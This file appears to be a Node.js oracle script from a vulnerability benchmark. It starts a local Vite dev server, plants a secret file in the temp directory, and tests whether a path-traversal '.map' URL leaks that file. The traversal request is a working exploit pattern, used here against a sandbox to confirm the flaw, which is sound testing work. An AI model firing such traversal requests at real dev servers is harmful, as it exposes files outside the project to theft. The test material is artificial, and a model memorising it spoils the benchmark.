const fs = require('node:fs');
const path = require('node:path');
const os = require('node:os');

(async () => {
  let operation_completed = false;
  let exploit_succeeded = false;
  let evidence = '';

  function finish() {
    const out = { operation_completed, exploit_succeeded, evidence: String(evidence) };
    console.log('ORACLE_RESULT ' + JSON.stringify(out));
  }

  try {
    const vite = await import('vite');

    const unique = 'vite-oracle-' + process.pid + '-' + Date.now();
    const baseTmp = fs.mkdtempSync(path.join(os.tmpdir(), unique + '-'));
    const root = path.join(baseTmp, 'project');
    const depsDir = path.join(root, 'node_modules', '.vite', 'deps');
    fs.mkdirSync(depsDir, { recursive: true });

    const benignFile = path.join(depsDir, 'ok.js.map');
    const benignContent = '{"version":3,"file":"ok.js","mappings":""}';
    fs.writeFileSync(benignFile, benignContent);

    const secretBase = path.join(os.tmpdir(), unique + '-secret.txt');
    fs.writeFileSync(secretBase, 'TOP_SECRET_' + unique);

    const server = await vite.createServer({
      root,
      logLevel: 'silent',
      server: { middlewareMode: true }
    });

    await server.listen();

    async function hit(url) {
      return await new Promise((resolve, reject) => {
        const req = { method: 'GET', url, headers: {} };
        const res = {
          statusCode: 200,
          headers: {},
          body: Buffer.alloc(0),
          setHeader(k, v) { this.headers[String(k).toLowerCase()] = v; },
          getHeader(k) { return this.headers[String(k).toLowerCase()]; },
          end(chunk) {
            if (chunk) this.body = Buffer.concat([this.body, Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk))]);
            resolve({ statusCode: this.statusCode || 200, body: this.body.toString('utf8'), headers: this.headers, ended: true });
          },
          write(chunk) {
            if (chunk) this.body = Buffer.concat([this.body, Buffer.isBuffer(chunk) ? chunk : Buffer.from(String(chunk))]);
          }
        };

        let nextCalled = false;
        const next = (err) => {
          nextCalled = true;
          if (err) reject(err);
          else resolve({ statusCode: res.statusCode || 404, body: res.body.toString('utf8'), headers: res.headers, ended: false, nextCalled: true });
        };

        try {
          server.middlewares(req, res, next);
        } catch (e) {
          reject(e);
        }

        setTimeout(() => {
          if (nextCalled) return;
        }, 0);
      });
    }

    const benignResp = await hit('/node_modules/.vite/deps/ok.js.map');
    if (!(benignResp && benignResp.body.includes('"version":3'))) {
      await server.close();
      operation_completed = false;
      exploit_succeeded = false;
      evidence = 'benign request failed or unexpected response';
      return finish();
    }

    operation_completed = true;

    const traversal = '/node_modules/.vite/deps/../../../../tmp/' + path.basename(secretBase) + '.map';
    let malResp;
    try {
      malResp = await hit(traversal);
    } catch (e) {
      exploit_succeeded = false;
      evidence = 'malicious request threw after benign success: ' + (e && e.message ? e.message : String(e));
      await server.close();
      return finish();
    }

    const leaked = malResp && typeof malResp.body === 'string' && malResp.body.includes('TOP_SECRET_' + unique);
    exploit_succeeded = !!leaked;
    evidence = leaked
      ? 'outside-root secret content was served via traversal .map path'
      : 'no outside-root secret content observed in response';

    await server.close();
    return finish();
  } catch (e) {
    operation_completed = false;
    exploit_succeeded = false;
    evidence = 'setup/module/benign failure: ' + (e && e.message ? e.message : String(e));
    return finish();
  }
})();